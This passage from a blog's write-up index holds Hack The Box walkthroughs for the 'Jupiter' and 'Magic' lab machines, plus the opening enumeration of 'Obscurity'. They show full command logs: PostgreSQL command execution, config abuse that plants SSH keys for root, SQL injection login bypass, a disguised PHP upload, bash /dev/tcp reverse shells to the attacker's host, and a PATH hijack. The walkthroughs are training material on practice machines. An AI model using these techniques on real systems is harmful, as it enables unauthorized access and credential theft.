-p22,80 -sC -sV 10.10.11.216 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 17:56 GMT Nmap scan report for 10.10.11.216 (10.10.11.216) Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA) |_ 256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://jupiter.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.80 seconds Web server vhosts └─$ wfuzz -u http://jupiter.htb/ -H \u0026#39;Host: FUZZ.jupiter.htb\u0026#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 12 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://jupiter.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000001955: 200 211 L 798 W 34390 Ch \u0026#34;kiosk\u0026#34; gobuster └─$ gobuster dir -u http://jupiter.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://jupiter.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 162] /index.html (Status: 200) [Size: 19680] /contact.html (Status: 200) [Size: 10141] /about.html (Status: 200) [Size: 12613] /img (Status: 301) [Size: 178] [--\u0026gt; http://jupiter.htb/img/] /services.html (Status: 200) [Size: 11969] /css (Status: 301) [Size: 178] [--\u0026gt; http://jupiter.htb/css/] /portfolio.html (Status: 200) [Size: 11913] /js (Status: 301) [Size: 178] [--\u0026gt; http://jupiter.htb/js/] └─$ gobuster dir -u http://kiosk.jupiter.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error --exclude-length 178 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://kiosk.jupiter.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 178 [+] User Agent: gobuster/3.6 [+] Extensions: js,php,txt,html [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /login (Status: 200) [Size: 34390] /profile (Status: 302) [Size: 29] [--\u0026gt; /login] /signup (Status: 200) [Size: 34390] /public (Status: 302) [Size: 31] [--\u0026gt; /public/] /admin (Status: 302) [Size: 24] [--\u0026gt; /] /plugins (Status: 302) [Size: 24] [--\u0026gt; /] /live (Status: 302) [Size: 24] [--\u0026gt; /] Web Servers Foothold If we reload the kiosk.jupiter.htb we see a bunch of requests The most interesting is to /api/ds/query It contains raw sql query in rawSql And also the type indicates postgresql We could try injecting own query Let\u0026rsquo;s test for RCE We have to perform several steps: DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; And it works Let\u0026rsquo;s get reverse shell User #1 When I navigated to /dev/shm to download linpeas and pspy, I noticed interesting files postgres@jupiter:/dev/shm$ ls -lha total 3.0M drwxrwxrwt 3 root root 120 Nov 9 15:12 . drwxr-xr-x 20 root root 4.0K Nov 9 13:55 .. -rw-rw-rw- 1 juno juno 815 Mar 7 2023 network-simulation.yml -rw------- 1 postgres postgres 27K Nov 9 13:55 PostgreSQL.4072022748 drwxrwxr-x 3 juno juno 100 Nov 9 15:12 shadow.data Running pspy shows that juno is running shadow-simulation.sh script It\u0026rsquo;s a Shadow Simulator - is a discrete-event network simulator that directly executes real application code, enabling you to simulate distributed systems with thousands of network-connected processes in realistic and scalable private network experiments using your laptop, desktop, or server running Linux network-simulation.yml postgres@jupiter:/dev/shm$ cat network-simulation.yml general: # stop after 10 simulated seconds stop_time: 10s # old versions of cURL use a busy loop, so to avoid spinning in this busy # loop indefinitely, we add a system call latency to advance the simulated # time when running non-blocking system calls model_unblocked_syscall_latency: true network: graph: # use a built-in network graph containing # a single vertex with a bandwidth of 1 Gbit type: 1_gbit_switch hosts: # a host with the hostname \u0026#39;server\u0026#39; server: network_node_id: 0 processes: - path: /usr/bin/python3 args: -m http.server 80 start_time: 3s # three hosts with hostnames \u0026#39;client1\u0026#39;, \u0026#39;client2\u0026#39;, and \u0026#39;client3\u0026#39; client: network_node_id: 0 quantity: 3 processes: - path: /usr/bin/curl args: -s server start_time: 5s We can modify the yml Let\u0026rsquo;s do that \u0026lt;SNIP\u0026gt; hosts: # a host with the hostname \u0026#39;server\u0026#39; server: network_node_id: 0 processes: - path: /usr/bin/cp args: /bin/bash /tmp/juno start_time: 3s - path: /usr/bin/chmod args: 6755 /tmp/juno start_time: 5s \u0026lt;SNIP\u0026gt; After few minutes, we our copy of the bash, which we can run as juno postgres@jupiter:/dev/shm$ /tmp/juno -p juno-5.1$ id uid=114(postgres) gid=120(postgres) euid=1000(juno) egid=1000(juno) groups=1000(juno),119(ssl-cert),120(postgres) User #2 I switched to ssh by adding my public key And now I have additional group juno@jupiter:~$ id uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science) Now we have access to /opt/solar-flares juno@jupiter:~$ find / -group science 2\u0026gt;/dev/null /opt/solar-flares /opt/solar-flares/flares.csv /opt/solar-flares/xflares.csv /opt/solar-flares/map.jpg /opt/solar-flares/start.sh /opt/solar-flares/logs /opt/solar-flares/logs/jupyter-2023-03-10-25.log /opt/solar-flares/logs/jupyter-2023-03-08-37.log /opt/solar-flares/logs/jupyter-2023-03-08-38.log /opt/solar-flares/logs/jupyter-2023-03-08-36.log /opt/solar-flares/logs/jupyter-2023-03-09-11.log /opt/solar-flares/logs/jupyter-2023-03-09-24.log /opt/solar-flares/logs/jupyter-2023-03-08-14.log /opt/solar-flares/logs/jupyter-2023-03-09-59.log /opt/solar-flares/flares.html /opt/solar-flares/cflares.csv /opt/solar-flares/flares.ipynb /opt/solar-flares/.ipynb_checkpoints /opt/solar-flares/mflares.csv It\u0026rsquo;s a Jupyter Notebook It\u0026rsquo;s default port is 8888 juno@jupiter:/opt/solar-flares$ netstat -tulpn (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:8888 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3000 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:5432 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - udp 0 0 0.0.0.0:68 0.0.0.0:* - juno@jupiter:/opt/solar-flares$ ps -ef | grep jup jovian 1171 1 0 13:55 ? 00:00:00 /usr/bin/python3 /usr/local/bin/jupyter-notebook --no-browser /opt/solar-flares/flares.ipynb Let\u0026rsquo;s configure port forwarding with -L 8888:localhost:8888 It asks for password/token We can check logs and we see the token [W 13:55:55.539 NotebookApp] Terminals not available (error was No module named \u0026#39;terminado\u0026#39;) [I 13:55:55.546 NotebookApp] Serving notebooks from local directory: /opt/solar-flares [I 13:55:55.546 NotebookApp] Jupyter Notebook 6.5.3 is running at: [I 13:55:55.546 NotebookApp] http://localhost:8888/?token=93a510badf67fc14909e3886fe650956f91e86941894099b [I 13:55:55.546 NotebookApp] or http://127.0.0.1:8888/?token=93a510badf67fc14909e3886fe650956f91e86941894099b [I 13:55:55.546 NotebookApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation). [W 13:55:55.550 NotebookApp] No web browser found: could not locate runnable browser. [C 13:55:55.550 NotebookApp] To access the notebook, open this file in a browser: file:///home/jovian/.local/share/jupyter/runtime/nbserver-1171-open.html Or copy and paste one of these URLs: http://localhost:8888/?token=93a510badf67fc14909e3886fe650956f91e86941894099b or http://127.0.0.1:8888/?token=93a510badf67fc14909e3886fe650956f91e86941894099b [I 15:42:42.225 NotebookApp] 302 GET / (127.0.0.1) 1.850000ms [I 15:42:42.985 NotebookApp] 302 GET /tree? (127.0.0.1) 2.720000ms logs/jupyter-2023-11-09-55.log (END) We\u0026rsquo;re in We can navigate to http://localhost:8888/notebooks/flares.ipynb From there we can execute python code I\u0026rsquo;ll add my public key └─$ ssh jovian@10.10.11.216 Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu Nov 9 03:53:06 PM UTC 2023 System load: 0.0 Usage of /: 81.3% of 12.33GB Memory usage: 24% Swap usage: 0% Processes: 239 Users logged in: 1 IPv4 address for eth0: 10.10.11.216 IPv6 address for eth0: dead:beef::250:56ff:feb9:e13d Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. jovian@jupiter:~$ Root sudo jovian@jupiter:~$ sudo -l Matching Defaults entries for jovian on jupiter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User jovian may run the following commands on jupiter: (ALL) NOPASSWD: /usr/local/bin/sattrack I tried executing but it returns error jovian@jupiter:~$ sudo sattrack Satellite Tracking System Configuration file has not been found. Please try again! jovian@jupiter:~$ strace sattrack execve(\u0026#34;/usr/local/bin/sattrack\u0026#34;, [\u0026#34;sattrack\u0026#34;], 0x7fff7a96c540 /* 23 vars */) = 0 brk(NULL) = 0x558aa997a000 arch_prctl(0x3001 /* ARCH_??? */, 0x7ffd2b615b30) = -1 EINVAL (Invalid argument) mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6b33375000 access(\u0026#34;/etc/ld.so.preload\u0026#34;, R_OK) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \u0026#34;/etc/ld.so.cache\u0026#34;, O_RDONLY|O_CLOEXEC) = 3 \u0026lt;SNIP\u0026gt; futex(0x7f6b3318177c, FUTEX_WAKE_PRIVATE, 2147483647) = 0 newfstatat(1, \u0026#34;\u0026#34;, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x2), ...}, AT_EMPTY_PATH) = 0 write(1, \u0026#34;Satellite Tracking System\\n\u0026#34;, 26Satellite Tracking System ) = 26 newfstatat(AT_FDCWD, \u0026#34;/tmp/config.json\u0026#34;, 0x7ffd2b615600, 0) = -1 ENOENT (No such file or directory) write(1, \u0026#34;Configuration file has not been \u0026#34;..., 57Configuration file has not been found. Please try again! ) = 57 getpid() = 3822 exit_group(1) = ? +++ exited with 1 +++ If we look for config.json it\u0026rsquo;s located in different directory jovian@jupiter:~$ find / -name \u0026#39;config.json\u0026#39; 2\u0026gt;/dev/null /usr/local/share/sattrack/config.json /usr/local/lib/python3.10/dist-packages/zmq/utils/config.json I\u0026rsquo;ll copy the file to tmp jovian@jupiter:~$ cat /tmp/config.json { \u0026#34;tleroot\u0026#34;: \u0026#34;/tmp/tle/\u0026#34;, \u0026#34;tlefile\u0026#34;: \u0026#34;weather.txt\u0026#34;, \u0026#34;mapfile\u0026#34;: \u0026#34;/usr/local/share/sattrack/map.json\u0026#34;, \u0026#34;texturefile\u0026#34;: \u0026#34;/usr/local/share/sattrack/earth.png\u0026#34;, \u0026#34;tlesources\u0026#34;: [ \u0026#34;http://celestrak.org/NORAD/elements/weather.txt\u0026#34;, \u0026#34;http://celestrak.org/NORAD/elements/noaa.txt\u0026#34;, \u0026#34;http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink\u0026amp;FORMAT=tle\u0026#34; ], \u0026#34;updatePerdiod\u0026#34;: 1000, \u0026#34;station\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;LORCA\u0026#34;, \u0026#34;lat\u0026#34;: 37.6725, \u0026#34;lon\u0026#34;: -1.5863, \u0026#34;hgt\u0026#34;: 335.0 }, \u0026#34;show\u0026#34;: [ ], \u0026#34;columns\u0026#34;: [ \u0026#34;name\u0026#34;, \u0026#34;azel\u0026#34;, \u0026#34;dis\u0026#34;, \u0026#34;geo\u0026#34;, \u0026#34;tab\u0026#34;, \u0026#34;pos\u0026#34;, \u0026#34;vel\u0026#34; ] } If we try to run sattrack again, it fails but different errors It created for files in /tmp/tle jovian@jupiter:~$ sattrack Satellite Tracking System tleroot does not exist, creating it: /tmp/tle/ Get:0 http://celestrak.org/NORAD/elements/weather.txt Could not resolve host: celestrak.org Get:0 http://celestrak.org/NORAD/elements/noaa.txt Could not resolve host: celestrak.org Get:0 http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink\u0026amp;FORMAT=tle Could not resolve host: celestrak.org Satellites loaded No sats jovian@jupiter:~$ ls -lha /tmp/tle/ total 8.0K drwxrwxr-x 2 jovian jovian 4.0K Nov 9 16:19 . drwxrwxrwt 15 root root 4.0K Nov 9 16:20 .. -rw-rw-r-- 1 jovian jovian 0 Nov 9 16:19 \u0026#39;gp.php?GROUP=starlink\u0026amp;FORMAT=tle\u0026#39; -rw-rw-r-- 1 jovian jovian 0 Nov 9 16:18 noaa.txt -rw-rw-r-- 1 jovian jovian 0 Nov 9 16:18 weather.txt According to config.json, tleroot is the destination (where those files were created) We can host authorized_keys on attack box Thus change tleroot to /root/.ssh And change tlesources to http://\u0026lt;ATTACK_BOX\u0026gt;/authorized_keys jovian@jupiter:/tmp$ cat config.json { \u0026#34;tleroot\u0026#34;: \u0026#34;/root/.ssh/\u0026#34;, \u0026#34;tlefile\u0026#34;: \u0026#34;weather.txt\u0026#34;, \u0026#34;mapfile\u0026#34;: \u0026#34;/usr/local/share/sattrack/map.json\u0026#34;, \u0026#34;texturefile\u0026#34;: \u0026#34;/usr/local/share/sattrack/earth.png\u0026#34;, \u0026#34;tlesources\u0026#34;: [ \u0026#34;http://10.10.16.4/authorized_keys\u0026#34; ], \u0026#34;updatePerdiod\u0026#34;: 1000, \u0026#34;station\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;LORCA\u0026#34;, \u0026#34;lat\u0026#34;: 37.6725, \u0026#34;lon\u0026#34;: -1.5863, \u0026#34;hgt\u0026#34;: 335.0 }, \u0026#34;show\u0026#34;: [ ], \u0026#34;columns\u0026#34;: [ \u0026#34;name\u0026#34;, \u0026#34;azel\u0026#34;, \u0026#34;dis\u0026#34;, \u0026#34;geo\u0026#34;, \u0026#34;tab\u0026#34;, \u0026#34;pos\u0026#34;, \u0026#34;vel\u0026#34; ] } Run sattrack jovian@jupiter:/tmp$ sudo sattrack Satellite Tracking System Get:0 http://10.10.16.4/authorized_keys tlefile is not a valid file And now we can connect as root └─$ ssh root@10.10.11.216 Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu Nov 9 04:26:42 PM UTC 2023 System load: 0.0 Usage of /: 81.3% of 12.33GB Memory usage: 24% Swap usage: 0% Processes: 243 Users logged in: 2 IPv4 address for eth0: 10.10.11.216 IPv6 address for eth0: dead:beef::250:56ff:feb9:e13d Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings root@jupiter:~# ","date":"October 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/jupiter/images/jupiter.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/jupiter/","summary":"Jupiter Enumeration Nmap └─$ nmap -Pn -p- 10.10.11.216 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 17:44 GMT Nmap scan report for 10.10.11.216 (10.10.11.216) Host is up (0.25s latency). Not shown: 65521 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 23/tcp closed telnet 25/tcp closed smtp 80/tcp open http 110/tcp closed pop3 113/tcp closed ident 139/tcp closed netbios-ssn 143/tcp closed imap 445/tcp closed microsoft-ds 993/tcp closed imaps 1025/tcp closed NFS-or-IIS 1720/tcp closed h323q931 1723/tcp closed pptp 3389/tcp closed ms-wbt-server 5900/tcp closed vnc Nmap done: 1 IP address (1 host up) scanned in 36.","tags":["HTB","grafana","postgresql","cve-2019-9193","pspy","shadow-simulation","jupyter-notebook","sattrack","arftracksat"],"title":"[HTB] Machine: Jupiter"},{"categories":null,"contents":"Magic Enumeration nmap └─$ nmap -Pn -p- 10.10.10.185 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 17:53 BST Nmap scan report for 10.10.10.185 (10.10.10.185) Host is up (0.33s latency). Not shown: 65510 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 49.95 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.185 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 18:01 BST Nmap scan report for 10.10.10.185 (10.10.10.185) Host is up (0.20s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Magic Portfolio |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.45 seconds Web Server gobuster └─$ gobuster dir -u http://10.10.10.185 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.185 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.185/images/] /login.php (Status: 200) [Size: 4221] /.php (Status: 403) [Size: 277] /.html (Status: 403) [Size: 277] /index.php (Status: 200) [Size: 4051] /assets (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.185/assets/] /upload.php (Status: 302) [Size: 2957] [--\u0026gt; login.php] /logout.php (Status: 302) [Size: 0] [--\u0026gt; index.php] Foothold There\u0026rsquo;s login page Trying ' or 1=1-- - works Trying to upload a php file results in error To bypass the filter, as the box name implies, we have play around with magic bytes I\u0026rsquo;ll download some image and add php code using any text editor Then I\u0026rsquo;ll upload it using the upload page Make sure to have a proxy on to modify the request later If we upload the image with jpg or any other image extensions, when we will open the image from the server, the backend will handle it as image But if we add .php.jpg (could be png or other extension), the backend processes it differently So we modify our extension from the Burp We successfully upload the \u0026ldquo;image\u0026rdquo; and we see backend is processing it as text file But we don\u0026rsquo;t see the execution Could be lost within all this garbage So I had to place the code below, after all the image junk And we have our rce Let\u0026rsquo;s get our reverse shell I played around with different payloads bash+-c+\u0026quot;%2Fbin%2Fbash -i \u0026gt;%26 %2Fdev%2Ftcp%2F10.10.16.4%2F6666 0\u0026gt;%261\u0026quot; worked for me User /var/www/Magic www-data@ubuntu:/var/www/Magic/images/uploads$ ls -lha /var/www/Magic/ total 52K drwxr-xr-x 4 www-data www-data 4.0K Jul 12 2021 . drwxr-xr-x 4 root root 4.0K Jul 6 2021 .. -rwx---r-x 1 www-data www-data 162 Oct 18 2019 .htaccess drwxrwxr-x 6 www-data www-data 4.0K Jul 6 2021 assets -rw-r--r-- 1 www-data www-data 881 Oct 16 2019 db.php5 drwxr-xr-x 4 www-data www-data 4.0K Jul 6 2021 images -rw-rw-r-- 1 www-data www-data 4.5K Oct 22 2019 index.php -rw-r--r-- 1 www-data www-data 5.5K Oct 22 2019 login.php -rw-r--r-- 1 www-data www-data 72 Oct 18 2019 logout.php -rw-r--r-- 1 www-data www-data 4.5K Oct 22 2019 upload.php We have creds inside db.php5 file www-data@ubuntu:/var/www/Magic/images/uploads$ cat /var/www/Magic/db.php5 \u0026lt;?php class Database { private static $dbName = \u0026#39;Magic\u0026#39; ; private static $dbHost = \u0026#39;localhost\u0026#39; ; private static $dbUsername = \u0026#39;theseus\u0026#39;; private static $dbUserPassword = \u0026#39;iamkingtheseus\u0026#39;; private static $cont = null; public function __construct() { die(\u0026#39;Init function is not allowed\u0026#39;); } public static function connect() { // One connection through whole application if ( null == self::$cont ) { try { self::$cont = new PDO( \u0026#34;mysql:host=\u0026#34;.self::$dbHost.\u0026#34;;\u0026#34;.\u0026#34;dbname=\u0026#34;.self::$dbName, self::$dbUsername, self::$dbUserPassword); } catch(PDOException $e) { die($e-\u0026gt;getMessage()); } } return self::$cont; } public static function disconnect() { self::$cont = null; } } We can\u0026rsquo;t ssh, since it requires public key su don\u0026rsquo;t work either Since it\u0026rsquo;s a db creds, let\u0026rsquo;s dump the database There is no mysql binary, but we have mysqldump www-data@ubuntu:/var/www/Magic/images/uploads$ mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic mysqldump: [Warning] Using a password on the command line interface can be insecure. -- MySQL dump 10.13 Distrib 5.7.29, for Linux (x86_64) -- -- Host: localhost Database: Magic -- ------------------------------------------------------ -- Server version 5.7.29-0ubuntu0.18.04.1 /*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */; /*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */; /*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */; /*!40101 SET NAMES utf8 */; /*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */; /*!40103 SET TIME_ZONE=\u0026#39;+00:00\u0026#39; */; /*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */; /*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */; /*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=\u0026#39;NO_AUTO_VALUE_ON_ZERO\u0026#39; */; /*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */; -- -- Table structure for table `login` -- DROP TABLE IF EXISTS `login`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!40101 SET character_set_client = utf8 */; CREATE TABLE `login` ( `id` int(6) NOT NULL AUTO_INCREMENT, `username` varchar(50) NOT NULL, `password` varchar(100) NOT NULL, PRIMARY KEY (`id`), UNIQUE KEY `username` (`username`) ) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1; /*!40101 SET character_set_client = @saved_cs_client */; -- -- Dumping data for table `login` -- LOCK TABLES `login` WRITE; /*!40000 ALTER TABLE `login` DISABLE KEYS */; INSERT INTO `login` VALUES (1,\u0026#39;admin\u0026#39;,\u0026#39;Th3s3usW4sK1ng\u0026#39;); /*!40000 ALTER TABLE `login` ENABLE KEYS */; UNLOCK TABLES; /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */; /*!40101 SET SQL_MODE=@OLD_SQL_MODE */; /*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */; /*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */; /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */; /*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */; /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */; /*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */; -- Dump completed on 2023-10-28 11:12:42 We have found a password Th3s3usW4sK1ng, which works for su www-data@ubuntu:/var/www/Magic/images/uploads$ su - theseus Password: theseus@ubuntu:~$ Root linpeas shows unknown SUID binary \u0026lt;SNIP\u0026gt; -rwsr-x--- 1 root users 22K Oct 21 2019 /bin/sysinfo (Unknown SUID binary!) \u0026lt;SNIP\u0026gt; It returns system information Let\u0026rsquo;s ltrace it theseus@ubuntu:/tmp$ ltrace /bin/sysinfo \u0026lt;SNIP\u0026gt; popen(\u0026#34;lshw -short\u0026#34;, \u0026#34;r\u0026#34;) = 0x557cb5517280 fgets(WARNING: you should run this program as super-user. \u0026lt;SNIP\u0026gt; popen(\u0026#34;fdisk -l\u0026#34;, \u0026#34;r\u0026#34;) = 0x557cb5517280 \u0026lt;SNIP\u0026gt; popen(\u0026#34;free -h\u0026#34;, \u0026#34;r\u0026#34;) = 0x557cb5517280 It doesn\u0026rsquo;t use full path We create lshw script and make it executable Then we modify PATH variable and add the directory where we placed lshw theseus@ubuntu:/dev/shm$ cat lshw #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.4/7777 0\u0026gt;\u0026amp;1 theseus@ubuntu:/dev/shm$ chmod +x lshw theseus@ubuntu:/dev/shm$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin theseus@ubuntu:/dev/shm$ export PATH=\u0026#34;$(pwd):$PATH\u0026#34; theseus@ubuntu:/dev/shm$ echo $PATH /dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin theseus@ubuntu:/dev/shm$ Run the binary It hangs Check your listener, we should get our root shell theseus@ubuntu:/dev/shm$ sysinfo ====================Hardware Info==================== ","date":"October 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/magic/images/magic.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/magic/","summary":"Magic Enumeration nmap └─$ nmap -Pn -p- 10.10.10.185 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 17:53 BST Nmap scan report for 10.10.10.185 (10.10.10.185) Host is up (0.33s latency). Not shown: 65510 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 49.95 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.185 --min-rate 5000 Starting Nmap 7.","tags":["HTB","sqli","injection","upload","filter","webshell","php","mysqldump","su","suid","path-hijack","apache"],"title":"[HTB] Machine: Magic"},{"categories":null,"contents":"Obscurity Enumeration nmap └─$ nmap -Pn -p- 10.10.10.168 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 20:06 GMT Nmap scan report for 10.10.10.168 (10.10.10.168) Host is up (0.17s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp closed http 8080/tcp open http-proxy 9000/tcp closed cslistener Nmap done: 1 IP address (1 host up) scanned in 41.33 seconds └─$ nmap -Pn -p- -sC -sV 10.10.10.168 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 20:10 GMT Nmap scan report for 10.10.10.168 (10.10.10.168) Host is up (0.18s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA) | 256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA) |_ 256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519) 80/tcp closed http 